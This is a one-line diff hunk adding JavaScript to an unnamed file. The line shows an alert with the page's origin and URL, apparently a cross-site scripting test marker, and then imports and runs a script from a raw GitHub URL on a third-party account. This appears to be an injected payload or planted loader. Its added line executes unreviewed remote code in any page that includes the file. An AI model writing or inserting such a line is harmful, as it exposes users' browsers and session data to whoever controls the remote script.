@@ -1,0 +1,1 @@
+alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');import('https://raw.githubusercontent.com/abbesachraf/js/main/js.js');
